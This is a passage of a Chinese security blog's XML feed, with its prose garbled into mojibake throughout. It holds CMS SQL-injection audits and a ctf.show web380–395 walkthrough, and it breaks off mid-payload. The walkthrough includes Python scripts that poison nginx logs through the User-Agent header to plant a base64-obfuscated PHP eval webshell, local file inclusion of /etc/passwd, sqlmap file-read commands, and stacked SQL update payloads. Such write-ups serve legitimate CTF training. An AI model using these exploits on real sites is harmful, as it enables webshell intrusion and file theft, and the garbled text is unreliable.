        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬ç¯‡ä¾æ—§æ˜¯é’ˆå¯¹sqlæ³¨å…¥è¿›è¡Œçš„ä»£ç å®¡è®¡ï¼Œå…¶ä¸­é’ˆå¯¹çš„æ˜¯æœ‰è¿‡æ»¤çš„cmsè¿›è¡Œåˆçº§å®¡è®¡</p><h1 id="å¼€å§‹"><a href="#å¼€å§‹" class="headerlink" title="å¼€å§‹"></a>å¼€å§‹</h1><p>é¦–å…ˆæŒæ¡ä¸­å¿ƒæ–‡ä»¶common.fun.phpï¼ŒåŒæ—¶ä»ä¸­æŸ¥æ‰¾sqlæ³¨å…¥ç‚¹ï¼š</p><p>å¼€å¤´ä¾¿é‡åˆ°äº†<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210916201102713.png" alt="image-20210916201102713"></p><p>æ­¤è½¬ä¹‰å‡½æ•°ï¼Œé¢å¯¹ä»–åªèƒ½é‡‡ç”¨å®½å­—èŠ‚å°†æ³¨é‡Šç¬¦å·è½¬ä¹‰æ‰ï¼Œæˆ–è€…åˆ©ç”¨äºŒæ¬¡æ³¨å…¥æ¥bypass</p><p>æµ‹è¯•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210916203132447.png" alt="image-20210916203132447"></p><p>å½“æˆ‘ç‚¹å‡»ä¿å­˜çš„æ—¶å€™ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210916203535197.png" alt="image-20210916203535197"></p><p>ä»–è°ƒç”¨çš„æ˜¯make4_saveï¼Œå…¨å±€ä¸€ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210916203705535.png" alt="image-20210916203705535"></p><p>æ­¤æ—¶æ‰§è¡Œinsertæ’å…¥æ“ä½œï¼Œä»–ä¼ å…¥çš„å€¼æ˜¯æœ‰è½¬ä¹‰ç¬¦å·çš„ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210917102245593.png" alt="image-20210917102245593"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æŸ¥æ‰¾updatetableï¼ŒæŸ¥çœ‹æ˜¯å¦æ»¡è¶³äºŒæ¬¡æ³¨å…¥ï¼š</p><p>å‡ºç°äº†å¾ˆå¤šğŸ‘‡</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210916203930936.png" alt="image-20210916203930936"></p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨æŸ¥çœ‹æˆ‘ä»¬ä¿¡æ¯çš„æ—¶å€™å°±æ˜¯updateçš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œè¯­å¥çš„æ—¶å€™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210917102345023.png" alt="image-20210917102345023"></p><p>å¯ä»¥çœ‹å‡ºæ¥ä»–å­˜å…¥mysqlæ•°æ®åº“çš„æ—¶å€™æ˜¯æ²¡æœ‰å¸¦è½¬ä¹‰ç¬¦å·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å»æŸ¥çœ‹æ›´æ–°åçš„å†…å®¹çš„æ—¶å€™ï¼Œå°±æ˜¯åˆ©ç”¨payloadçš„æ—¶å€™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210916203408894.png" alt="image-20210916203408894"></p><p>æœ¬æ¬¡ç”¨åˆ°çš„å®¡è®¡æ–¹æ³•æ˜¯mysqlç›‘æ§</p>]]></content>
      
      
      <categories>
          
          <category> CMS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ·¡ç„¶qqywå›¾æ ‡ç‚¹äº®ç³»ç»Ÿå®¡è®¡</title>
      <link href="/2021/09/15/dan-ran-qqyw-tu-biao-dian-liang-xi-tong-shen-ji/"/>
      <url>/2021/09/15/dan-ran-qqyw-tu-biao-dian-liang-xi-tong-shen-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ­¤ç¯‡æ˜¯å…³äºsqlæ³¨å…¥æŒ–æ˜çš„åˆçº§å®¡è®¡æ€è·¯</p><p>æœ¬cmsçš„å®‰è£…ç¨‹åºåœ¨ino.phpï¼Œæ•°æ®åº“éœ€è¦5.5çš„ï¼Œ5.7ä¼šæŠ¥é”™</p><h1 id="å…³é”®å­—æœç´¢"><a href="#å…³é”®å­—æœç´¢" class="headerlink" title="å…³é”®å­—æœç´¢"></a>å…³é”®å­—æœç´¢</h1><p>SQLæ³¨å…¥ï¼š select insert update mysql_query mysqliç­‰(æ³¨æ„å¤§å†™)</p><h1 id="å¼€å§‹ï¼š"><a href="#å¼€å§‹ï¼š" class="headerlink" title="å¼€å§‹ï¼š"></a>å¼€å§‹ï¼š</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915164346758.png" alt="image-20210915164346758"></p><p>(æ³¨æ„ç‚¹å‡»ä¸åŒºåˆ†å¤§å†™ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰ç‚¹å‡»)</p><p>å½“ç‚¹å¼€è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™åŸºæœ¬ä¼šå‘ç°å…¨æ˜¯æ— è¿‡æ»¤çš„sqlè¯­å¥</p><p>éšæœºæŠ½å–ä¸€ä¸ªå‡½æ•°è¿›è¡Œå…¨å±€æœç´¢</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915164912673.png" alt="image-20210915164912673"></p><p>åœ¨v144.phpä¸­æœ‰åº”ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»è®¿é—®ä¸€ä¸‹v144.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915165142832.png" alt="image-20210915165142832"></p><p>å®šä½ä¸€ä¸‹è¿™å¥è¯ï¼šä»å“ªé‡Œæ¥ï¼Œæ»šå›å“ªé‡Œå»ï¼</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915165241291.png" alt="image-20210915165241291"></p><p>éœ€è¦åŸŸååœ¨sohuquanè¿™ä¸ªæ•°ç»„é‡Œé¢ï¼Œç»§ç»­è·Ÿè¸ªï¼š$sohuquanï¼Œä»£ç å°±åœ¨ä¸Šé¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915165422583.png" alt="image-20210915165422583"></p><p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦domainå°±æ˜¯åˆ¤æ–­refereræ˜¯å¦åœ¨æœ¬å®˜ç½‘ä¸‹è¿‡æ¥çš„ï¼Œå› ä¸ºæˆ‘å½“å‰æ˜¯æ²¡æœ‰refererçš„æ‰€ä»¥ä¼šç»™æˆ‘å‡ºç°è¿™ä¸ªé—®é¢˜</p><p><strong>è§£å†³é—®é¢˜ï¼š</strong></p><ol><li>å¯ä»¥ç›´æ¥å°†è¿™ä¸€éƒ¨åˆ†çš„ä»£ç åˆ æ‰ï¼Œæ¯•ç«Ÿæ˜¯æœ¬ç€æŒ–æ˜sqlæ³¨å…¥æ¼æ´æ¥çš„</li><li>ä¿®æ”¹a herfæ ‡ç­¾æ¥ç®€å•ä¼ªé€ referer</li><li>åˆ©ç”¨æ’ä»¶é«˜æ•ˆç‡å†³ç»é—®é¢˜</li></ol><p>æˆ‘é‡‡ç”¨ç¬¬ä¸‰ç§ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915170515653.png" alt="image-20210915170515653"></p><p>ç´§æ¥ç€åˆå‡ºç°æ–°çš„é”™è¯¯ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¸ªæ–‡å­—ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915170548217.png" alt="image-20210915170548217"></p><p>å¯ä»¥åˆ¤æ–­åº”è¯¥æ˜¯éœ€è¦å‚æ•°ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915170725632.png" alt="image-20210915170725632"></p><p>ä¹Ÿå°±æ˜¯è¯´éœ€è¦å››ä¸ªå‚æ•°å‘—ï¼š<code>?api=ok&amp;u=1&amp;p=1&amp;id=1</code>æ¥è¯•è¯•</p><p>åˆå‡ºæ–°é”™è¯¯ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915170924895.png" alt="image-20210915170924895"></p><p>ç»§ç»­è·Ÿè¸ªï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915171041213.png" alt="image-20210915171041213"></p><p>åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆç”¨</p><p>ç°åœ¨å¯ä»¥æ ¹æ®ä¹‹å‰è·Ÿè¸ªçš„<code>ywID</code>å‡½æ•°è¿›è¡Œæ³¨å…¥äº†ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">ywID</span><span class="token punctuation">(</span><span class="token variable">$ID</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$SQL</span><span class="token operator">=</span><span class="token string">"SELECT * FROM  `yw` WHERE  `id` ="</span><span class="token punctuation">.</span><span class="token variable">$ID</span><span class="token punctuation">.</span><span class="token string">" LIMIT 0 , 30"</span><span class="token punctuation">;</span>    <span class="token variable">$FH</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$sj</span><span class="token operator">=</span><span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$FH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span>   <span class="token variable">$sj</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹å‡ºæ¥æ˜¯ä¸€ç‚¹è¿‡æ»¤ä¹Ÿæ²¡æœ‰ï¼Œæˆ‘å…ˆè¾“å…¥<code>1&#39;</code>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915172056065.png" alt="image-20210915172056065"></p><p>å‡ºç°äº†æŠ¥é”™ï¼Œè€Œä¸”æ˜¯ä¸‰æ¬¡ï¼Œå¾ˆå¯èƒ½æ˜¯idå‚æ•°è¢«è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œè¿™é‡Œæ²¡å¿…è¦æ·±ç©¶</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ç›²æ³¨è¯­å¥æ¥è¯•ä¸€ä¸‹<code>id=1 and if(1=1,sleep(2),0) --+</code>ç¡äº†è¶³è¶³æœ‰6ç§’ä¹‹ä¹…ï¼ï¼ï¼</p><p>é‚£ä¹ˆè¿™ä¸ªåœ°æ–¹å°±æ˜¯sqlæ³¨å…¥ç‚¹ï¼Œé™åˆ¶æ¡ä»¶æ˜¯refererï¼Œæ‰€ä»¥sqlmapç›´æ¥è·‘ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915173516674.png" alt="image-20210915173516674"></p><p>åˆ°è¿™åŸºæœ¬å°±å¯ä»¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> CMS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFä¹‹é»‘ç›’æµ‹è¯•</title>
      <link href="/2021/09/12/ctf-zhi-hei-he-ce-shi/"/>
      <url>/2021/09/12/ctf-zhi-hei-he-ce-shi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ€»ç»“é»‘ç›’æµ‹è¯•æ€è·¯</p><p>å¯èƒ½ç”¨åˆ°çš„å­—å…¸</p><pre><code>xy123admin888/install/index.php/clear.php/page.php/alsckdfy/index.php/debug</code></pre><h1 id="web380â€”â€”æµ‹è¯•URLå‚æ•°"><a href="#web380â€”â€”æµ‹è¯•URLå‚æ•°" class="headerlink" title="web380â€”â€”æµ‹è¯•URLå‚æ•°"></a>web380â€”â€”æµ‹è¯•URLå‚æ•°</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912194757348.png" alt="image-20210912194757348"></p><h1 id="web381â€”â€”æ‰¾åå°"><a href="#web381â€”â€”æ‰¾åå°" class="headerlink" title="web381â€”â€”æ‰¾åå°"></a>web381â€”â€”æ‰¾åå°</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912195054540.png" alt="image-20210912195054540"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912195114230.png" alt="image-20210912195114230"></p><h1 id="web382ã€383â€”â€”sqlä¸‡èƒ½å¯†ç "><a href="#web382ã€383â€”â€”sqlä¸‡èƒ½å¯†ç " class="headerlink" title="web382ã€383â€”â€”sqlä¸‡èƒ½å¯†ç "></a>web382ã€383â€”â€”sqlä¸‡èƒ½å¯†ç </h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210912202520991.png" alt="image-20210912202520991"></p><h1 id="web384â€”â€”çˆ†ç ´"><a href="#web384â€”â€”çˆ†ç ´" class="headerlink" title="web384â€”â€”çˆ†ç ´"></a>web384â€”â€”çˆ†ç ´</h1><p><strong>å¼€å§‹è¿‡æ»¤</strong></p><p>çˆ†ç ´</p><p><strong>å­—å…¸ç”Ÿæˆï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> strings1<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token comment" spellcheck="true"># å°å†™å­—æ¯a-z</span>s2<span class="token operator">=</span>string<span class="token punctuation">.</span>digits <span class="token comment" spellcheck="true"># æ•°å­—</span>f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'dict.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s1<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> s1<span class="token punctuation">:</span>        <span class="token keyword">for</span> k <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            <span class="token keyword">for</span> l <span class="token keyword">in</span> s2<span class="token punctuation">:</span>                <span class="token keyword">for</span> m <span class="token keyword">in</span> s2<span class="token punctuation">:</span>                    p<span class="token operator">=</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>l<span class="token operator">+</span>m                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>p<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>admin xy123</code></p><h1 id="web385â€”â€”ä¿¡æ¯æ³„éœ²"><a href="#web385â€”â€”ä¿¡æ¯æ³„éœ²" class="headerlink" title="web385â€”â€”ä¿¡æ¯æ³„éœ²"></a>web385â€”â€”ä¿¡æ¯æ³„éœ²</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210913205246502.png" alt="image-20210913205246502"></p><p>æ³¨æ„åè®®æ˜¯httpå¦åˆ™æ— æ³•è®¿é—®ï¼Œç„¶åç»§ç»­è®¿é—®åå°åœ°å€å³å¯</p><h1 id="web386â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web386â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web386â€”â€”æ–‡ä»¶åŒ…å«"></a>web386â€”â€”æ–‡ä»¶åŒ…å«</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210913205651877.png" alt="image-20210913205651877"></p><p>è®¿é—®clear.phpï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210913205945334.png" alt="image-20210913205945334"></p><p>å‡­ç»éªŒåˆ¤æ–­å‚æ•°ä¸ºfileï¼š<code>/clear.php?file=./install/lock.dat</code></p><p>å†è®¿é—®<code>/install/?install</code>å·²å˜æ ·ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210913210419038.png" alt="image-20210913210419038"></p><p>ç„¶åå»/alsckdfy/index.phpç”¨é»˜è®¤å¯†ç ç™»é™†å°±å¯ä»¥äº†</p><h1 id="web387â€”â€”æ—¥å¿—å†™é©¬"><a href="#web387â€”â€”æ—¥å¿—å†™é©¬" class="headerlink" title="web387â€”â€”æ—¥å¿—å†™é©¬"></a>web387â€”â€”æ—¥å¿—å†™é©¬</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210913210916477.png" alt="image-20210913210916477"></p><p>ç»™ä»–fileå‚æ•°<code>/debug/?file=/etc/passwd</code>å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œå»åŒ…å«ä¸€ä¸‹æ—¥å¿—æ–‡ä»¶<code>?file=/var/log/nginx/access.log</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210913212053079.png" alt="image-20210913212053079"></p><p>ç„¶åuaå¯ä»¥å‘½ä»¤æ‰§è¡Œ</p><p>ä¹Ÿå¯ä»¥ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/install/lock.dat'</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat /var/www/html/alsckdfy/check.php > /var/www/html/1.txt'</span><span class="token punctuation">)</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web388â€”â€”å…æ€"><a href="#web388â€”â€”å…æ€" class="headerlink" title="web388â€”â€”å…æ€"></a>web388â€”â€”å…æ€</h1><p><strong>pythonè„šæœ¬å‘åŒ…ï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url<span class="token operator">=</span><span class="token string">"http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/"</span>url2<span class="token operator">=</span><span class="token string">"http://fb707431-ebb7-41c8-9ce7-57da16163fec.chall.ctf.show/debug/?file=/var/log/nginx/access.log"</span>cmd<span class="token operator">=</span>b<span class="token string">"&lt;?php eval($_POST[1]);?>"</span>cmd<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#å…æ€å¤„ç†</span>headers<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">'''&lt;?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'b.php'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'system("cat alsckdfy/check.php");'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web389â€”â€”jwt"><a href="#web389â€”â€”jwt" class="headerlink" title="web389â€”â€”jwt"></a>web389â€”â€”jwt</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url<span class="token operator">=</span><span class="token string">"http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/"</span>url2<span class="token operator">=</span><span class="token string">"http://bf2e6fca-c437-4f5b-90c3-75b4087cfdc5.chall.ctf.show/debug/?file=/var/log/nginx/access.log"</span>cmd<span class="token operator">=</span>b<span class="token string">"&lt;?php eval($_POST[1]);?>"</span>cmd<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>headers<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token triple-quoted-string string">'''&lt;?php system('echo {0}|base64 -d  > /var/www/html/b.php');?>'''</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYxMDQ0MDA5MSwiZXhwIjoxNjEwNDQ3MjkxLCJuYmYiOjE2MTA0NDAwOTEsInN1YiI6ImFkbWluIiwianRpIjoiYzNlM2U5NjQ4OGI3NWY0MzY4YmE4Njg0ZTRjZWJlZTQifQ.hEV8CkkdvhKsNL_OrssrBzjzstVhq7_sQNefiuplSqU'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>headers<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'b.php'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span><span class="token string">'system("cat alsckdfy/check.php");'</span><span class="token punctuation">}</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h1><p>åœ¨page.phpé¡µé¢å­˜åœ¨sqlæ³¨å…¥</p><p>sqlmapä¸€å¥è¯æå®š<br><code>sqlmap -u http://fdbabc63-b2f3-4050-8b2e-9f5ee609119a.chall.ctf.show/page.php?id=2 --file-read /var/www/html/alsckdfy/check.php --batch</code><br>è¿è¡Œå®Œä¼šå°†æ–‡ä»¶ä¿å­˜åœ¨ä½ çš„æœ¬åœ°ï¼Œç›´æ¥è®¿é—®å°±æ‹¿åˆ°flag</p><h1 id="web391ã€392"><a href="#web391ã€392" class="headerlink" title="web391ã€392"></a>web391ã€392</h1><p><strong>sqlmapç»§ç»­ï¼š</strong></p><p><code>sqlmap -u http://042a780b-dfd3-4bd9-861c-81661b2915e0.chall.ctf.show/search.php?title=1 --file-read /var/www/html/alsckdfy/check.php --batch</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210914100321171.png" alt="image-20210914100321171"></p><h1 id="web393"><a href="#web393" class="headerlink" title="web393"></a>web393</h1><p>å‡ºç°äº†ä¸€ä¸ªæœç´¢å¼•æ“<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915143958686.png" alt="image-20210915143958686"></p><p><strong>urlä¸ºï¼š</strong><code>/link.php?id=4</code></p><p>æ˜¯æœ‰å‚æ•°çš„ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥è‚¯å®šæ˜¯ä¸æ•°æ®åº“æœ‰è¿æ¥çš„ï¼Œå¯ä»¥åˆ©ç”¨ä¸Šä¸€é¢˜çš„æ³¨å…¥ç‚¹æ¥è¿›è¡Œinsertæ³¨å…¥æˆ–è€…updateæ³¨å…¥ï¼Œå¹¶åˆ©ç”¨ssrfæ¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š<code>a&#39;;update link set url=&#39;file:///flag&#39; where id = 1;#</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210915145146426.png" alt="image-20210915145146426"></p><p>è¡¨åå­—linkå¯ä»¥è·‘å‡ºæ¥</p><h1 id="web394ã€395"><a href="#web394ã€395" class="headerlink" title="web394ã€395"></a>web394ã€395</h1><h3 id="æ–¹æ³•ä¸€ï¼š"><a href="#æ–¹æ³•ä¸€ï¼š" class="headerlink" title="æ–¹æ³•ä¸€ï¼š"></a>æ–¹æ³•ä¸€ï¼š</h3><p><code>a&#39;;update link set url=0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870 where id = 